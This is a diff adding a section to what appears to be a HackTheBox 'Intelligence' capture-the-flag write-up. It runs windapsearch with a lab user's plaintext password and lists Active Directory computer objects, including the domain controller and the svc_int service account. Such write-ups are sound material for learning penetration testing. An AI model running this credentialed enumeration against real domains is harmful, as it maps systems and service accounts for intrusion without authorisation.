@@ -354,3 +354,17 @@ smb: \Tiffany.Molina\Desktop\>
 [*] Starting domain dump
 [+] Domain dump finished
 ```
+
+```
+┌──(root💀kali)-[~/Downloads/hackthebox/inteligence]
+└─# ./windapsearch-linux-amd64 -d intelligence.htb -u 'Tiffany.Molina@intelligence.htb' -m computers -p 'NewIntelligenceCorpUser9876'                                                                
+dn: CN=DC,OU=Domain Controllers,DC=intelligence,DC=htb
+cn: DC
+operatingSystem: Windows Server 2019 Datacenter
+operatingSystemVersion: 10.0 (17763)
+dNSHostName: dc.intelligence.htb
+
+dn: CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
+cn: svc_int
+dNSHostName: svc_int.intelligence.htb
+```
